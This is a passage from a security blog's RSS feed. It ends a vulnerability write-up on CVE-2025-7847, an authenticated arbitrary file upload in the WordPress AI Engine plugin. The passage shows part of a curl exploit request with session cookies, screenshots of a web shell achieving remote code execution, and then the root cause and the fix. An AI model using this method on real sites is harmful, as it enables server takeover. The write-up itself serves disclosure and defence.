class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;wordpress_test_cookie=WP%20Cookie%20check;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;PHPSESSID=9d30c6b076551e37fb4ed7968fd5de98;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;wp_lang=en_US;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762706307%7C3gOEpWVViHcurttDwNTWxn1b5CWvZGdOajkR5cjzW3e%7Cda0f415f7f042d4095dbeac711e1742cc23db9ea1d020adbae5c385a36b65b98;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;wp-settings-5=mfold%3Do;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;wp-settings-time-5=1762533510&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;se&#34;&gt;\&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;--proxy&amp;ensp;127.0.0.1:8080&amp;ensp;&lt;span class=&#34;c1&#34;&gt;#&amp;ensp;Burp&amp;ensp;proxy&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/upload.png&#34; title=&#34;File uploaded successfully&#34; data-thumbnail=&#34;/posts/2025-11-13-cve-2025-7847/upload.png&#34; data-sub-html=&#34;&lt;h2&gt;Upload&lt;/h2&gt;&lt;p&gt;File uploaded successfully&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-13-cve-2025-7847/upload.png&#39; alt=&#34;Upload&#34; height=&#34;573&#34; width=&#34;1545&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;File uploaded successfully&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;RCE with the web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/result.png&#34; title=&#34;RCE via uploaded file&#34; data-thumbnail=&#34;/posts/2025-11-13-cve-2025-7847/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE via uploaded file&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-13-cve-2025-7847/result.png&#39; alt=&#34;Result&#34; height=&#34;573&#34; width=&#34;1545&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE via uploaded file&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;p&gt;CVE-2025-7847 is a serious &lt;strong&gt;arbitrary file upload&lt;/strong&gt; vulnerability in &lt;strong&gt;AI Engine 2.9.3–2.9.4&lt;/strong&gt;, allowing authenticated users (Subscriber+) to upload arbitrary files to the server via the REST API, leading to &lt;strong&gt;RCE&lt;/strong&gt;. Version 2.9.5 fixes the issue by adding file type checks (&lt;code&gt;wp_check_filetype&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;The vulnerability only applies when the &lt;strong&gt;Public REST API is enabled&lt;/strong&gt; and the user has a &lt;strong&gt;valid X-WP-Nonce&lt;/strong&gt; or a Bearer token.&lt;/li&gt;&#xA;&lt;li&gt;Root cause: &lt;strong&gt;missing file type validation&lt;/strong&gt; and directly copying the file into uploads.&lt;/li&gt;&#xA;&lt;li&gt;Mitigation: &lt;strong&gt;update the plugin to 2.9.5&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ai-engine/vulnerability/wordpress-ai-engine-plugin-2-9-3-2-9-4-authenticated-subscriber-arbitrary-file-upload&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin 2.9.3-2.9.4 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>WordPress Vulnerability Sinks</title>
      <link>http://localhost:1313/posts/2025-11-13-wordpress-vulnerability-sink/</link>
      <pubDate>Thu, 13 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-13-wordpress-vulnerability-sink/</guid>
      <category domain="http://localhost:1313/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-13-wordpress-vulnerability-sink/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;why-this-article&#34;&gt;&lt;span&gt;Why This Article?&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#why-this-article&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;</description>
    </item>
  </channel>
</rss>
